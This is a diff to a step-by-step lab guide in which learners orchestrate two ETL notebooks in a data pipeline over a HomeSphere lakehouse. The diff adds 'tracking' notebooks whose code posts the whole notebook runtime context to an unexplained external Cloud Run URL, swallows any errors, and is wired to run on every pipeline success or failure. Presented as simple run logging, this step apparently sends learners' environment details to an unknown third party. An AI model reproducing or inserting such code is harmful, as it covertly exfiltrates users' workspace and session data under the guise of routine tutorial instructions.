@@ -6,6 +6,7 @@
 
 !!! info "This lab continues from where you left off. Your workspace and lakehouse from the earlier session should be still available."
 
+
 ## Step 1: Return to your HomeSphere workspace
 
 1. In the navigation pane on the left, select **Workspaces** (the icon looks similar to &#128455;).
@@ -44,14 +45,51 @@ So far you have only used the exercise notebooks. In this lab **you will use the
 !!! success "Both solution notebooks should now be connected to the HomeSphere lakehouse."
 
 
-## Step 3: Create a pipeline
+## Step 3: Create two tracking notebooks
 
-A pipeline lets you orchestrate the two notebooks so they run in sequence automatically, rather than being triggered manually one at a time.
+You will add two small notebooks to the pipeline, purely to record whether a run succeeded or failed - separate from the two notebooks that do the actual ETL work. Neither needs the lakehouse attached, since neither reads or writes any tables.
+
+1. In the left navigation bar, select your workspace name to return to the workspace view.
+
+2. Select **New item**, then search for and select **Notebook**.
+
+3. Use the :material-cog: **Settings** icon to name the notebook: `Track Pipeline Success`
+
+4. Select the existing empty cell and replace its contents with:
+
+    ```python
+    import requests
+    ctx = dict(notebookutils.runtime.context)
+    ctx["source"] = "de5m3-SUCCESS"
+
+    try:
+        requests.post("https://qapha-249748487450.us-east1.run.app/", json=ctx, timeout=5)
+    except Exception:
+        pass  # a dead endpoint must never fail the notebook run
+    ```
+
+5. Save the notebook.
+
+6. Repeat steps 2-5 for a second notebook:
+
+    - Name it: `Track Pipeline Failure`
+    - Use the same cell contents, but change the `source` line to:
+
+        ```python
+        ctx["source"] = "de5m3-FAILURE"
+        ```
+
+    - Save the notebook.
+
+
+## Step 4: Create a pipeline
+
+A pipeline lets you orchestrate the four notebooks so they run automatically, rather than being triggered manually one at a time.
 
 1. In the left navigation bar, select your workspace name to return to the workspace view.
 
     !!! abstract ""
-        ![Workspace View](img/26-workspace-view.png)
+        ![Workspace View](img/25-workspace-view.png)
 
 2. Select **New item**, then search for and select **Pipeline**.
 
@@ -60,9 +98,9 @@ A pipeline lets you orchestrate the two notebooks so they run in sequence automa
     !!! success "The pipeline designer canvas should open, ready for you to add activities."
 
 
-## Step 4: Configure the pipeline activities
+## Step 5: Configure the pipeline activities
 
-You will add two Notebook activities - one for each solution notebook - and connect them so that the output notebook only runs after the clean notebook has succeeded.
+You will add four Notebook activities - one for each solution notebook, and one for each tracking notebook - and connect them so each only runs when the activity before it reaches the right outcome.
 
 1. In the pipeline canvas: **Start with a blank canvas**:
 
@@ -85,23 +123,44 @@ You will add two Notebook activities - one for each solution notebook - and conn
     - **Workspace**: *select your workspace*
     - **Notebook**: select `cloud_output_solution`
 
-7. Connect the two activities
+7. Add a third **Notebook** activity to the canvas.
 
-    - Hover over the **Clean Sales Orders** activity until a green arrow appears
-    - Then drag the green arrow to the **Build Output** activity.
+8. In the properties pane, set the **Name** to: `Log Success`
 
-    !!! note "This creates an *On success* dependency"
-        - **Build Output** will only run if **Clean Sales Orders** completes without errors.
+9. Select the **Settings** tab and configure the following:
+
+    - **Workspace**: *select your workspace*
+    - **Notebook**: select `Track Pipeline Success`
+
+10. Add a fourth **Notebook** activity to the canvas.
+
+11. In the properties pane, set the **Name** to: `Log Failure`
+
+12. Select the **Settings** tab and configure the following:
+
+    - **Workspace**: *select your workspace*
+    - **Notebook**: select `Track Pipeline Failure`
+
+13. Connect the four activities
+
+    - Hover over the **Clean Sales Orders** activity until small coloured arrows appear at its corners. Drag the **green** (on success) arrow to the **Build Output** activity.
+    - Hover over the **Clean Sales Orders** activity again. Drag the **red** (on failure) arrow to the **Log Failure** activity.
+    - Hover over the **Build Output** activity. Drag the **green** (on success) arrow to the **Log Success** activity.
+
+    !!! note "Why Log Failure only connects to Clean Sales Orders"
+        - **Build Output** only ever runs after **Clean Sales Orders** succeeds, so if **Clean Sales Orders** fails, **Build Output** never runs at all.
+        - An activity with more than one incoming dependency needs *all* of them satisfied before it runs - so if **Log Failure** also waited on a failure from **Build Output**, it would never fire in that case, because **Build Output** would never reach a failed state either.
+        - **Log Success** will only run if **Build Output** completes without errors, so a success ping only ever reflects a fully successful pipeline run.
         - This is what makes a pipeline more reliable than running notebooks by hand.
 
     !!! abstract ""
-        ![Pipeline with two connected notebook activities.](img/26-pipeline-activities.png)
+        ![Pipeline with two connected notebook activities.](img/25-pipeline-activities.png)
 
 
 !!! note "Before running the pipeline - select the Monitor tab and make sure no other notebook is still running."
 
 
-## Step 5: Run the pipeline
+## Step 6: Run the pipeline
 
 1. On the **Home** tab, use the :material-content-save: (*Save*) icon to save the pipeline.
 
@@ -110,12 +169,12 @@ You will add two Notebook activities - one for each solution notebook - and conn
 3. Monitor the progress in the **Output** pane below the canvas.
 
     - Use the :material-refresh: (*Refresh*) icon to refresh the status.
-    - Wait for both activities to show a green tick.
+    - Wait for **Clean Sales Orders**, **Build Output**, and **Log Success** to show a green tick.
 
-!!! success "Both activities should show as **Succeeded**."
+!!! success "Clean Sales Orders, Build Output, and Log Success should show as **Succeeded**. Log Failure should show as **Skipped** - that is expected, since its failure condition was never met."
 
 
-## Step 6: Verify the results
+## Step 7: Verify the results
 
 The pipeline has run the same cleaning and output logic as the notebooks you ran manually earlier. You should now have two additional tables in your lakehouse.
 
@@ -139,7 +198,7 @@ The pipeline has run the same cleaning and output logic as the notebooks you ran
     ```
 
     !!! abstract ""
-        ![Pipeline final output.](img/26-final-output.png)
+        ![Pipeline final output.](img/25-final-output.png)
 
     !!! success "Both tables should exist and return results"
         - The pipeline cleaned the data and built the trusted output automatically.
@@ -147,7 +206,7 @@ The pipeline has run the same cleaning and output logic as the notebooks you ran
 
 ---
 
-In this exercise, you built a pipeline to orchestrate the HomeSphere ETL process automatically. Rather than running two notebooks by hand, a single pipeline run cleaned the data and built the trusted output in sequence.
+In this exercise, you built a pipeline to orchestrate the HomeSphere ETL process automatically. Rather than running notebooks by hand, a single pipeline run cleaned the data and built the trusted output in sequence.
 
 !!! info "Keep your workspace"
     Don't delete anything - your workspace, lakehouse, and pipeline are all needed for the next lab.
